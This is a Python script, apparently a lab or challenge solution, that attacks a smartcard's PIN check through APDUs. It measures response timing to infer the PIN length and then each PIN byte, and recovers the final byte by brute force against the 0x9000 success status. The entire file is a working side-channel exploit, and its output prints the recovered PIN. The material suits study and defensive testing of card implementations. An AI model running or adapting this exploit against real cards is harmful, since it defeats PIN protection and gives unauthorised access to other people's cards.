import smartleia as sl
import numpy as np
import sys, signal
import binascii
import datetime, time

USE_LEIA = True
#USE_LEIA = False

# Handle Python 2/3 issues
def is_python_2():
	if sys.version_info[0] < 3:
		return True
	else:
		return False

# Python 2/3 hexlify helper
def local_hexlify(str_in):
	if is_python_2() == True:
		return binascii.hexlify(str_in)
	else:
		return (binascii.hexlify(str_in.encode('latin-1'))).decode('latin-1')


# Python 2/3 unhexlify helper
def local_unhexlify(str_in):
	if is_python_2() == True:
		return binascii.unhexlify(str_in)
	else:
		return (binascii.unhexlify(str_in.encode('latin-1'))).decode('latin-1')

###########"
def send_apdu(cardservice, apdu, verbose=False):
	apdu = local_unhexlify(apdu)
	a = datetime.datetime.now()
	to_transmit = [ord(x) for x in apdu]
	response, sw1, sw2 = cardservice.connection.transmit(to_transmit)
	b = datetime.datetime.now()
	delta = b - a
	if verbose == True:
		print(">          "+local_hexlify(apdu))
		print("<          SW1=%02x, SW2=%02x, %s" % (sw1, sw2, local_hexlify(''.join([chr(r) for r in response]))))
		print("           |= APDU took %d microseconds" % (int(delta.microseconds)))
	return "".join(map(chr, response)), sw1, sw2, int(delta.microseconds)

if USE_LEIA == True:
	reader = sl.LEIA('/dev/ttyACM0')
	reader.configure_smartcard(sl.T.T0, negotiate_pts=False)
else:
	# Dynamic check for necessary Pyscard Python package
	try:
		from smartcard.CardType import AnyCardType
		from smartcard.CardRequest import CardRequest
		from smartcard.util import toHexString, toBytes
	except:
		print("Error: it seems that the Pyscard Python package is not installed or detected ... Please install it!")
		sys.exit(-1)
	cardtype = AnyCardType()
	cardrequest = CardRequest(timeout=.2, cardType=cardtype)
	cardservice = cardrequest.waitforcard()
	cardservice.connection.connect()
	atr = cardservice.connection.getATR()
	print("ATR: "+toHexString(atr))
	
guessed_l = 0
guessed_pin = []
### Ctrl-C handler
def handler(signal, frame):
    print("\nSIGINT caught: exiting ...")
    print("[+] Guessed PIN so far is %s (%d over %d guessed)" % (bytearray(guessed_pin), len(guessed_pin), guessed_l))
    exit(0)

# Register Ctrl+C handler
signal.signal(signal.SIGINT, handler)

# Try to guess the lenght of the PIN
timings = []
for l in range(0, 64):
	if USE_LEIA == True:
		data = [0x0] * l
		resp = reader.send_APDU(sl.APDU(cla=0x00, ins=0x1b, p1=0x00, p2=0x00, data=[0x0] * l, le = 0x00, send_le=0))
		timings.append(resp.delta_t_answer)
	else:
		resp, sw1, sw2, delta = send_apdu(cardservice, "001B0000"+local_hexlify(chr(l))+("00"*l))
		timings.append(delta)

# Length is the maximum time
guessed_l = np.argmax(timings)
print("Guessed length is %d" % guessed_l)
if guessed_l < 1:
	print("Error: guessed length %d < 1 is too small!" % guessed_l)
	sys.exit(0)

# Guess the bytes!
guessed_pin = []
for p in range(len(guessed_pin), (guessed_l - 1)):
	print("Guessing byte %d" % len(guessed_pin))
	# Make some statistics
	stats = [0] * 256
	for b in range(0, 256):
		if USE_LEIA == True:
			stat_tests = 1
		else:
			stat_tests = 20
		for test in range(0, stat_tests):
			data = guessed_pin + ([b] * (guessed_l - len(guessed_pin)))
			if len(data) != guessed_l:
				print(" [-] Error!!")
			if USE_LEIA == True:
				resp = reader.send_APDU(sl.APDU(cla=0x00, ins=0x1b, p1=0x00, p2=0x00, data=data, le = 0x00, send_le=0))
				stats[b] += resp.delta_t_answer
			else:
				out = ""
				for n in data:
					out += chr(n)
				resp, sw1, sw2, delta = send_apdu(cardservice, "001B0000"+local_hexlify(chr(len(out)))+local_hexlify(out))
				stats[b] += delta
		print(" [+] Byte %d, testing value 0x%02x, stats = %f" % (len(guessed_pin), b, stats[b]))
	print("==> Guessed byte %d is 0x%02x" % (len(guessed_pin), np.argmax(stats)))
	guessed_pin.append(np.argmax(stats))

# Now guess the last byte with the 0x9000 oracle since timing does not differ
print("Guessing last byte with the 0x9000 oracle")
found = False
for b in range(0, 256):
	data = guessed_pin + [b]
	if len(data) != guessed_l:
		print(" [-] Error!!")
	if USE_LEIA == True:
		resp = reader.send_APDU(sl.APDU(cla=0x00, ins=0x1b, p1=0x00, p2=0x00, data=data, le = 0x00, send_le=0))
		sw1 = resp.sw1
		sw2 = resp.sw2
	else:
		out = ""
		for n in data:
			out += chr(n)
		resp, sw1, sw2, delta = send_apdu(cardservice, "001B0000"+local_hexlify(chr(len(out)))+local_hexlify(out))
	if sw1 == 0x90 and sw2 == 0x00:
		# Got it!
		print("==> Guessed byte %d is 0x%02x" % (len(guessed_pin), b))
		guessed_pin.append(b)
		found = True
		break

# That's it, we have guessed our PIN
if found == True:
	print("[+] Guessed PIN is %s" % bytearray(guessed_pin))
else:
	print("[X] Failed to guess PIN (erroneous value is %s)" % bytearray(guessed_pin))



